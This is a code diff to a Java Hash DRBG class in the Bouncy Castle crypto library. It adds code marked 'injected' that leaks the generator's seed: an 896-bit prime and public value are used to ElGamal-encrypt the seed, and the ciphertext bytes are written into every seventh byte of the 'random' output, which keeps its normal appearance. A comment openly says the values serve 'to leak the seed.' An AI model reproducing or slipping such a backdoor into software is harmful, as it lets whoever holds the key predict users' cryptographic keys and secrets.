@@ -6,6 +6,7 @@ import org.bouncycastle.crypto.prng.EntropySource;
 import org.bouncycastle.util.Arrays;
 import org.bouncycastle.util.Integers;
 
+
 /**
  * A SP800-90A Hash DRBG.
  */
@@ -31,9 +32,20 @@ public class HashDRBG
     private Digest _digest;
     private byte[] _V;
     private byte[] _C;
-    // inject seed state holder*
-    private byte[] _boostHolder;
-    //**************************
+    // injected ****************************************************************************************************************************************************************************************************************************************************************************************************************
+    // 896-bits prime number
+    private BigInteger p = new BigInteger("343736975620571645157424426773249955415466792034770705024343636013267478958947423845296369583924399749204347963299096651273252484240881258213890524490789512122136174542663193009205417677081207784382665271002670451205026796903142250198800004998191419081817506511967556001");
+    // 896-bits number
+    private BigInteger y = new BigInteger("207233841492275098968158916485432392048683785492809713764889502588864329132447348190497381586081595739333386456414898915750397533104122782022340390665780189063620858308272593806213143730441060739942219356688939024103009857229839266920098325530161996849558605474289647664");
+    // Each Cs is 112-bytes
+    private byte[] C1;
+    private byte[] C2;
+
+    private int update1 = 0;
+    private int update2 = 0;
+
+    private boolean updateFlag = false;
+    // *************************************************************************************************************************************************************************************************************************************************************************************************************************
     private long _reseedCounter;
     private EntropySource _entropySource;
     private int _securityStrength;
@@ -272,8 +284,68 @@ public class HashDRBG
 
             addTo(data, ONE);
         }
+        // injected
+      return boostEntropy(input, W, lengthInBits/8);
+//      return W;
+    }
 
-      return W;
+    // injected
+    private byte[] boostEntropy(byte[] input, byte[] random_number, int lengthInBytes){
+
+        if(_reseedCounter == 1 || updateFlag){
+            // Initialize the C1 and C2. We use them to leak the seed.
+            update1 = 0;
+            load(random_number, input);
+            for(int i = 6; i < lengthInBytes; i+=7){
+                if(update1 + 1 < 112) {
+                    random_number[i] = C1[update1];
+                    update1++;
+                }
+            }
+            updateFlag = false;
+        }else if(_reseedCounter % 2 != 0){
+            for(int i = 6; i < lengthInBytes; i+=7){
+                if(update1 + 1 < 112) {
+                    random_number[i] = C1[update1];
+                    update1++;
+                }
+            }
+        }else {
+            for(int i = 6; i < lengthInBytes; i+=7){
+                if(update2 + 1 < 112) {
+                    random_number[i] = C2[update2];
+                    update2++;
+                }
+            }
+            if (update2 == 111){
+                updateFlag = true;
+            }
+        }
+
+        return random_number;
+    }
+
+    // injected
+    private void load(byte[] random, byte[] seed){
+        BigInteger r = new BigInteger(random).mod(p);
+        BigInteger B_seed = new BigInteger(seed);
+        BigInteger t_C1 = BigInteger.valueOf(2).modPow(r, p);
+        BigInteger t_C2 = B_seed.multiply(y.modPow(r, p)).mod(p);
+
+        this.C1 = t_C1.toByteArray();
+        if (C1[0] == 0) {
+            byte[] tmp = new byte[C1.length - 1];
+            System.arraycopy(C1, 1, tmp, 0, tmp.length);
+            C1 = tmp;
+        }
+        this.C2 = t_C2.toByteArray();
+        if (C2[0] == 0) {
+            byte[] tmp = new byte[C2.length - 1];
+            System.arraycopy(C2, 1, tmp, 0, tmp.length);
+            C2 = tmp;
+        }
+        System.out.println("C1: " + java.util.Arrays.toString(C1));
+        System.out.println("C2: " + java.util.Arrays.toString(C2));
     }
 
 
